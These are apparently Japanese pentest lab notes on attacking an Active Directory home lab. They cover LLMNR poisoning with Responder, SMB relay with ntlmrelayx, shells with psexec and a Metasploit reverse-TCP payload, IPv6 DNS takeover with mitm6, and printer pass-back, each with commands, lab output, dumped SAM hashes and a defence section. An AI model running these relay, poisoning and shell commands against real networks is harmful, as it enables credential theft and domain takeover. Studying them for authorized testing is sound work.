- シチュエーション
	- クライアントがいいて、ペンテストを実行する
	- ペンテスト開始時に、クライアントにpcを送る
	- そして、組織内のVPNに接続すると、自動的に家までのVPNも確立される
	- なので、実際に現地に行く必要はない
	- このシチュエーションは、何か一つのpcがすでに侵害されていることが前提となっている
		- ハックされたか、機器を落としたかをしたとする
	- なので、すでに足掛かりを得た状態で攻撃を進めていく



# LLMNR Poisoning
- LLMNR : リンクローカルマルチキャスト名前解決
	- ネットワーク内でDNSがホストの特定に失敗した場合に使用される
	- 少し前は、MBTNSとして知られていた、今ではLLMNRにアップグレードされた
- LLMNRの欠点
	- 実際にネットワーク内のトラフィックを傍受して、応答すると、ユーザー名とハッシュを取得できる
	- MITM攻撃ができてしまう
- LLMNR Poisiningの流れ
	- AD内のホストが、ADサーバーに対して、「\\hackm」にアクセスしたいと言う
	- でも実際には、「\\hackme」であって、「\\hackm」ではない
	- で、ADに「\\hackm」はないので、AD内のホストに対して、ブロードキャストで、「\\hackm」って知ってる？って聞く
	- 攻撃者が「\\hackm」を知っていると応答して、ユーザー名とハッシュをリクエストする
	- そうすると、DCが、ユーザー名とハッシュを返してくれる
	- で、ハッシュが弱い時、クラックできて、パスワードがわかる
- 使えるツール
	- Responder
		- ネットワークトラフィックに応答して、LLMNR Poisoningを行う
		- これを実際に行うなら、朝早くか、昼食後に行うのが良さそう
			- 多くの人がコンピューターにログインして、トラフィックが増えるから
実行コマンド
```sh
sudo responder -I tun0 -dwPv
```

hashcatの対象を指定する番号は、以下のサイトとか、`hashcat | grep "対象のハッシュ"`で検索できる
- https://hashcat.net/wiki/doku.php?id=example_hashes

Responderで取得することのあるNTLM v2ハッシュは、取得するたびに異なる
- NTLM v1 ハッシュだと、毎回同じ


## 攻撃実証
まず、AD内に入ったKali Linuxで、Responderを立ち上げる
![](https://i.imgur.com/DNIUTks.png)

ADに属してるドメイン参加ホスト(THE PUNISHER (Frank Castle))から、kali linuxのIPに向けて、リクエストしてみる
![](https://i.imgur.com/3Hp74GN.png)

すると、このようにユーザーネームと、NTLMv2-SSP Hashを取得することができる
![](https://i.imgur.com/1XwcBDW.png)

パスワードが弱い時、実際にクラックできる
![](https://i.imgur.com/rcB9HlT.png)

## 防御・対策
- LLMNRとNBT-NSを無効にすることが重要
	- DCのグループポリシーから行える

実際に無効化する手順
DCのServer ManagerのToolsから、Group Policy Managementを開いて
![](https://i.imgur.com/UMwksGL.png)


![](https://i.imgur.com/NbKVqMn.png)

![](https://i.imgur.com/ozKOxML.png)

一番下にある、「Turn off multicast name resolution」のポリシーを有効化する
![](https://i.imgur.com/hgZuTCS.png)



もしできなかったら、ネットワークアクセス制御を行う
- ネットワーク上で、特定のMACアドレスを許可するような、設定をするべき
- 「このMACアドレスはネットワーク上で許可されています」のような感じの
	- ネットワークアクセスにも限界はあるが、簡易的な対策としては有効

そして、強力なユーザーパスワードを要求するべき
- これにより実際にパスワードをクラックされる可能性を減らすことができる

しかし、最大の防御はLLMNRを無効化するべき



# SMB Relay
- ResponderでキャプチャしたNTLM認証（ハッシュ）を、別のホストに「中継（リレー）」して、そのホストにログインしようとする攻撃
- 例えば、Responderでハッシュを取得できたけど、クラックできない状況
	- SMBリレーを利用してマシンにアクセスできる

攻撃ができる条件
- ターゲット上でSMB署名が無効化されているか、強制されていないこと
	- デフォルトではSMB署名はワークステーションで有効化されていないし、強制されていない

ポイント
SMBリレーが「意味のある攻撃」になるには
- ハッシュを持っているユーザーが、リレー先のマシンで**ローカル管理者**である必要がある
- そうでない場合、たとえリレーが成功しても、「できることが少ない or ない」

## 攻撃の流れ
まず、SMB署名がないホストを特定する
Nmapでできる
```sh
nmap --script=smb2-security-mode.nse -p445 <$Target_IP or Network> -Pn
```
理想的にはメッセージ署名が有効にはなっているが、必須ではない状態を求めている

ホストでSMB署名が無効または強制されていない状態を発見したら、Responderの設定を変更する
- キャプチャするのではなく、実際に中継されていることを確認するために**SMBとHTTPをオフにする**
```sh
sudo nano /etc/responder/Responder.conf
```

設定ができたら、Responderを実行する
```sh
sudo responder -I tun0 -v
```

ntlmrelayxというツールも実行する
- SMB署名が無効・強制されていないことを確認したホストをターゲットをtargets.txtとして設定して実行する
	- `-l`オプションを設定すると、シェルを開くこともできる
	- `-c "whoami"` : これでコマンドも実行できる
```sh
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

これで、Responderがハッシュをキャプチャすると、そのハッシュをそのままNTLMリレーに転送して、選択されたターゲットにハッシュをさらに転送できるようになる
そして、キャプチャしたハッシュを持つマシンで、ローカル管理者であればなんらかの成果を得られる

Responderにまずスキャンされるようなイベントを起こす必要がある


## 攻撃実証

nmapで、DCにSMB署名がないかを確認する
結果として、DCでは、SMB署名が強制されていることがわかった
DCにはsmbリレー攻撃はできない
![](https://i.imgur.com/7CPZGwb.png)


しかし、他のドメイン参加ホストに対して行ってみると、SMB署名が有効化されているが、強制はされていないことがわかる
![](https://i.imgur.com/nAtaGy4.png)

そこで、「SMB署名が有効化されているが、強制はされていない」ターゲットをまとめて、書く
![](https://i.imgur.com/PUUN3Wg.png)


responderの設定ファイルをsmb relay攻撃用に書き換える
```sh
sudo nano /etc/responder/Responder.conf
```

SMBとHTTPをOnからOffにする
![](https://i.imgur.com/b5hmBiN.png)


Responderを実行する
- 実行した時にSMBとHTTPがオフになっていることを確認する
```sh
sudo responder -I eth1 -v
```

![](https://i.imgur.com/UTT8YS1.png)

### SAMの取得
impacket-ntlmrelayxという名前で実行する
```sh
impacket-ntlmrelayx -tf targets.txt -smb2support 
```

最後に、Responderに捕捉されるようなイベントを起こす
ここでは、ドメイン参加ホストから、攻撃者のKaliのマシンにアクセスする
![](https://i.imgur.com/IXpTlqR.png)

ドメイン参加ホスト上ではアクセスできないと表示される
![](https://i.imgur.com/eVUkdpf.png)

しかし、実際にはアクセスできていて、smbリレー攻撃が行えた
Responder
![](https://i.imgur.com/TKcilGo.png)

impacket-ntlmrelayxの結果
![](https://i.imgur.com/hQ5xgdJ.png)

ポイント
- fcastleとしてログインしている、自身hのホスト(192.168.56.102)にはリレーできない
```sh
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.56.102 controlled, attacking target smb://192.168.56.102
[-] Authenticating against smb://192.168.56.102 as MARVEL/FCASTLE FAILED
```

しかし、fcastleは他のホスト(192.168.56.103)でも管理者権限として存在していて、そのホスト(192.168.56.103)に対するsmbリレー攻撃は成功している
```sh
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.56.102 controlled, attacking target smb://192.168.56.103
[*] Authenticating against smb://192.168.56.103 as MARVEL/FCASTLE SUCCEED
```

そして、192.168.56.103のSAM ハッシュを取得できている
```sh
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c10aa40e86d4992a473a589f70e80704:::
peterparker:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Done dumping SAM hashes for host: 192.168.56.103
```


### シェルの取得
Responderの準備をするまでは一緒
ここでは、impacket-ntlmrelayxのオプションを使って、シェルを取得する
- オプションで`-i`をつけて実行する
```sh
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

同じようにドメイン参加ホストから、攻撃者のkaliにアクセスする

すると、smbリレー攻撃が実行される
![](https://i.imgur.com/0d97XYB.png)

そして、192.168.56.103に対するシェルが開かれていることがわかる
```sh
[*] Authenticating against smb://192.168.56.103 as MARVEL/FCASTLE SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

シェルに接続する
```sh
nc 127.0.0.1 11000
```

実際に、用意されているコマンドを使用できる
用意されているコマンドは、「help」で出力される
![](https://i.imgur.com/WYhqOf4.png)


### コマンドの実行
Responderの準備をするまでは一緒
ここでは、impacket-ntlmrelayxのオプションを使って、コマンドを実行する
- オプションで`-c`をつけて実行する
```sh
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

同じようにドメイン参加ホストから、攻撃者のkaliにアクセスする

すると、smbリレー攻撃が実行される
ここでは、whoamiの実行結果が、「nt authority\system」なので、192.168.56.103でローカル管理者権限を持つとわかる
![](https://i.imgur.com/e1xldiU.png)



## 防御・対策
全てのデバイスでSMB署名を有効化すること
- 第一にできる対策
- SMB Relay攻撃を受け付けないようにできる
- 欠点
	- ファイルコピーの速度が10%から20%程度低下するよう
	- そのため、対象の組織が大量のファイルコピーを行なっていて、その速度が重要である場合は、ネットワークでSMB署名を有効にしないという選択肢が必要かもしれない
- しかし、ほとんどの組織にとって、問題なく、仮に少しパフォーマンスが遅くなったとしても、安全性とのトレードオフは許容範囲内

NTLM認証の無効化
- SMB Relay攻撃を止められる
- 欠点
	- Kerberousが機能しなくなった時に、通常はNTLMにフォールバックすることで、攻撃が可能になる

アカウントの階層化
- ベストプラクティス

ローカル管理者の制限
- ローカル管理者がいない場合、smb リレー攻撃は実行しても大きな成果は得られない
	- SAMのハッシュをダンプできないし、詳細に列挙もできない
- 横展開（Lateral movement）を大幅に防止できる
- LAPSのようなツールを利用できる
- 欠点
	- サービスデスクへの問い合わせチケットが増える可能性がある
	- ユーザーがインストールしたいアプリをいちいち、サービスデスクに伝えないといけない
	- 大きな会社では、サービスデスクがそのような権限を持っていることが多いから


# シェルの取得
いくつかのハッシュをダンプ、クラックできたので、シェルを取得できる

## 実証
- impacket-psexec 
	- ハッシュやパスワードで、シェルを確立できる
	- あまり防御されない
	- これが定番
	- もし、impacket-psexecがうまくうごかない時は、以下を試す。使い方は一緒
		- **impacket-wmiexec**
		- **impacket-smbexec**

パスワードがクラックできた時
```sh
impacket-psexec MARVEL/fcastle:'Password1'@192.168.56.102
```

ハッシュを取得できた時
```sh
impacket-psexec administrator@192.168.56.103 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```
![](https://i.imgur.com/mbkE8l8.png)


- Metasploitの「Windows/smb/psexec」というモジュール
	- ハッシュやパスワードで、シェルを確立できる
	- しかし、防御される可能性も高い
```sh
msfconsole
use Windows/smb/psexec
```

しかし、このままだとデフォルトで、設定されているペイロードがx64に対応していないので、変更する必要がある
```sh
set payload windows/x64/meterpreter/reverse_tcp
```

そのほかの設定
```sh
msf6 exploit(windows/smb/psexec) > set rhosts 192.168.56.102
rhosts => 192.168.56.102
msf6 exploit(windows/smb/psexec) > set smbdomain MARVEL.local
smbdomain => MARVEL.local
msf6 exploit(windows/smb/psexec) > set smbuser fcastle
smbuser => fcastle
msf6 exploit(windows/smb/psexec) > set smbpass Password1
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.56.104
LHOST => 192.168.56.104
```


シェルを取得しないと、DC侵害ができないわけではない
しかし、シェルを使うと機密ファイルの探索などできるから、あったらいいよねって感じ

# IPv6を使ったDNSなりすまし攻撃
IPv6を使ったDNS乗っ取り攻撃
- 現時点ではこれが定番の攻撃方法

Windows ネットワーク上で動作するマシンについて考えると、通常はIPv4で動作している
- IPv6は使っていない

Q : IPv4を利用しているが、v6がオンになっている場合v6のDNSを担当するのは誰か
A : 誰もいない

そこで――
攻撃者が何をするか？
1.	ネットワーク内にIPv6対応の偽のDNSサーバーを立てる
	- これは簡単にできる（例：Rogue DHCPv6やRA spoofing）
2.	Windowsマシンは、「DNSサーバー誰もいない！あ、この人（攻撃者）が名乗り出た」と思って、偽のDNSサーバーを使ってしまう
3.	結果、IPv6での通信（例：SMB、LDAPなど）が攻撃者のサーバーに向かう

攻撃者のサーバーで以下が可能
- NTLM認証情報の取得（Resonderなどを使って）
- SMBリレーやLDAPリレー攻撃を実施
- 例えば、取得したNTLM認証を使ってドメインコントローラー（DC）に接続し、
- DCに新しい管理者アカウントを作る
- それで正規の方法でログインしてしまう

なぜなら、全くアクセスがない状態で、実行できる最もクレイジーな攻撃なひとつ
- これに対する対策する


攻撃の流れ
1. mitm6 を使ってネットワーク内で 偽のIPv6 DNSサーバー を起動
2. ターゲットWindowsが自動的に fakewpad.marvel.local にアクセス（WPAD）しようとする
3. そのときに NTLM認証 が発生（自動）
4. ntlmrelayx がその認証をキャッチし、DCのLDAPSにリレー
5. 成功すれば、リレー先で 管理操作（例：アカウント作成） が可能

## 攻撃実証
- MITM6というツールを使う
- kaliでは、`sudo apt install mitm6`でインストールできる

ntlmrelayxのオプションを使って、コマンドを実行する
- `-6` : IPv6リレーを指定する
- `-t` : リレー先のターゲットの指定する
	- ここでは、DCのldapsを指定する
	- NTLMで認証された情報を そのままLDAPSにリレーして何か操作（例：アカウント作成など）を行うために使う
- `-wh fakewpad.marvel.local`
	- `-wh` は “wpad hostname” の略で、クライアントに提供する偽のWPADサーバー名を指定する
	- Windowsマシンは自動プロキシ検出（WPAD）を使ってインターネット設定を探すため、wpad.marvel.local のようなドメインに問い合わせ
	- 攻撃者はそれを偽装し、fakewpad.marvel.local を NTLM認証を引き出すための名前として利用
- `-l` 
	- 取得した認証情報やファイルの保存場所を指定するオプション
	- この例だと、カレントディレクトリに `lootme/` フォルダを作って、中にすべて保存される
```sh
impacket-ntlmrelayx -6 -t ldaps://192.168.56.101 -wh fakewpad.marvel.local -l lootme
```


次に、mitm6の実行する
- `-d` :  ドメインを指定する必要がある
- `-i` : インターフェースの指定
```sh
sudo mitm6 -d marvel.local -i eth1
```

これを立てておくと、ネットワーク上でイベントが発生した時
- マシンの再起動
- 誰かがデバイスへログイン
そのイベントを取得、NTLMリレーを通じてドメインコントローラーにリレーできる

### 再起動イベント
実際に再起動する
![](https://i.imgur.com/pvrLS9P.png)


すると、impacket-ntlmrelayxの方にこんな感じのログが出てくる
![](https://i.imgur.com/IwQf0ja.png)

これを確認した後、Kaliのホームフォルダにlootmeというフォルダができていることがわかる
```sh
┌──(kali㉿kali)-[~]
└─$ ls
192.168.56.103_samhashes.sam  arp.cache  Desktop  Documents  Downloads  hash.txt  lootme  Music  Pictures  Public  targets.txt  Templates  Videos
```

中を覗いてみると、LDAPドメインダンプがあることがわかる
```sh
┌──(kali㉿kali)-[~/lootme]
└─$ ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

実際に、domain_computers.htmlを開くと、ネット内のコンピューターの情報がまとまっている
![](https://i.imgur.com/7gB9bQL.png)

ドメイングループも同様にみることができる
![](https://i.imgur.com/vELXOj3.png)

ドメインユーザーも見ることができて、ここにはdescriptionも載っているので、ここから初期アクセスできる可能性もある
![](https://i.imgur.com/KiHxTBg.png)

最後にいつログインされてかもわかる
- 意外と重要な情報で、これらはハニーポットアカウントである可能性もある
- 真っ先に除外できる
![](https://i.imgur.com/w93z9fB.png)



### 管理アカウントログインイベント
ドメイン参加イベントで、管理者でログインするとする
![](https://i.imgur.com/rHt6Bvr.png)

すると、ドメインユーザーとして、ユーザーが作成される
![](https://i.imgur.com/mWQMADq.png)


## 防御
- IPv6を使ったDNSなりすまし攻撃に対する防御

今すぐに解決する方法
- 内部でIPv6を無効にすること
	- デメリットもいくつかある
- ブロックを活用できる
　- 内部でIPv6を使用していない場合、mitm6 を防ぐ最も安全な方法は、DHCPv6トラフィックとルーターアドバタイズメント（RA）をWindowsファイアウォールのグループポリシーでブロックすること
- IPv6を完全に無効化するのは副作用がある場合があるため、以下の定義済みルールを「許可」ではなく「ブロック」に設定
	　- （受信）コアネットワーキング – IPv6用DHCPプロトコル（DHCPV6-In）
	　- （受信）コアネットワーキング – ルーターアドバタイズメント（ICMPv6-In）
	　- （送信）コアネットワーキング – IPv6用DHCPプロトコル（DHCPV6-Out）
- WPAD（Web Proxy Auto-Discovery）が社内で使われていない場合は、グループポリシーと WinHttpAutoProxySvc サービスの無効化により停止する
	- ベストプラクティス
- LDAPおよびLDAPSへのリレー攻撃は、LDAP署名およびLDAPチャネルバインディングの両方を有効にすることでのみ防げる
	- LDAP署名とSMB署名を強制する
- 管理者ユーザーを保護されたユーザーグループ（Protected Users）」に追加するか、または「委任不可のアカウント」として設定することで、そのユーザーのなりすまし（委任経由）を防止できる


## パスバック攻撃
- MFP（多機能プリンター）の悪用
	- この攻撃は、企業環境でよく見られる多機能プリンター（MFP）を標的とする
	- MFPは通常、印刷、コピー、FAXなどの機能に加え、企業ネットワークとの連携機能（スキャンしてメール送信など）を持っている
	- この連携には、LDAPやSMTP、ネットワーク共有などの統合が必要

*  LDAP連携の悪用
	* MFPがLDAPサーバーと連携する際、LDAPサーバーにクエリを実行するために適切な認証情報が設定されている必要がある
	* この認証情報はMFPに保存されているか、ユーザーの認証情報がLDAPサーバーに渡される

*   パスバック攻撃の概要
	* パスバック攻撃は、MFPに保存されている、またはユーザーが入力するLDAP認証情報を取得することを目的とした攻撃

*   Embedded Web Service (EWS) へのアクセス
    * 攻撃者はまず、MFPのEmbedded Web Service（EWS）にアクセスする
	    * EWSはMFPのオンライン設定にアクセスするためのインターフェース
    * 多くのMFPは出荷時にデフォルトの管理者認証情報が設定されており、管理ガイドに記載されているこれらの情報がEWSへの初期アクセスに利用されることがある
    * また、Printer Exploitation Toolkit (PRET) や Praeda といったツールもEWSへのアクセスや情報開示、コード実行に利用される可能性がある

*   LDAPサーバー設定の変更
    *  EWSに認証してアクセスした後、攻撃者はMFPのLDAP設定を見つける
    *  既存の正当なLDAPサーバーのアドレスを、攻撃者が制御する悪意のあるLDAPサーバーのIPアドレスに置き換える
    *  変更を保存した後、攻撃者は悪意のあるLDAPサーバー上で、MFPのLDAP設定で指定されているポート（例: 389番ポート）でNetcatリスナーのようなツールを設定し、着信接続を待ち受ける

*   認証情報の取得
    *   設定変更後、MFPがLDAPクエリを実行しようとすると、そのクエリは攻撃者が制御する悪意のあるLDAPサーバーに送信される
    *   MFPがリソース（例: スキャンしてメール送信機能）を使用する際にユーザー認証が必要な場合、次に不注意なユーザーがMFPのコントロールパネルに認証情報を入力すると、その情報が攻撃者のLDAPサーバーに送信され、キャプチャされる
    *   MFPがメールアドレス検索のためにLDAP認証情報を保存する設定になっていて、そのモデルがそれをサポートしている場合、保存された認証情報も攻撃者のLDAPサーバーに「パスバック」され、取得される可能性がある

*   他の設定への応用
    *   同様の攻撃は、MFPの認証をサポートする他の設定に対しても実施可能
    *   Windowsサインイン設定も標的となり得る
    * 既存のドメインを攻撃者のドメインに置き換えることで、次にドメインユーザーがコントロールパネルでサインインした際、認証情報が攻撃者のドメインコントローラーに送信される
    *   SMTP設定に対しても攻撃を行うことができ、既存のSMTPサーバーを攻撃者のSMTPサーバーに置き換えることで、SMTP認証用の保存された認証情報を取得できる可能性がある

*   攻撃の利点
	* MFPは、物理的にアクセスしやすく、セキュリティ管理が不十分であることが多く、デフォルトの認証情報がそのまま使われていることもある
	* これらの要因から、MFPは、ネットワークへの侵入や権限昇格を目指す攻撃者にとって、大きな成果が期待できるにもかかわらず、リスクの低い標的となる





# 汎用的に使えるTips
## hashcat
hashcatでクラックする時に便利なオプション
`-O` 
- 最適化モード（Optimized Kernel）
- 処理速度が上がる（特に GPU 使用時）

`-r rules/OneRule.rule`
- ルールベース変換（Rule-based Attack）
- 辞書ファイルの各行に変形ルール（追加、削除、反転など）を適用して試す

辞書ファイルで大きいもの : **rockyou2021.txt**
- 中身：リークされたパスワードの超大規模リスト
- サイズ：1GB超えることもある（元祖 rockyou.txt より大きい）
- 辞書攻撃で使う「候補パスワード」のリスト

 また、場所や地域に詳しいことも大事
- 例えば、スポーツが盛んなところだったら、スポーツチームの名前とか、選手の名前とか
- 会社名に関するパスワードだったりもする

### hash-identifier
- 持っているハッシュが何なのかを知らべられる
	- https://www.kali.org/tools/hash-identifier/


# まとめ
攻撃を始める時
 
- まず、Responderを立ち上げる
	- Scanする
		- トラフィックを産むために
	- 午前中や昼食後の時間が最適なタイミング
- ウェブサイトを探す...サブネットのスキャン
- デフォルトの認証情報
- あるもので探す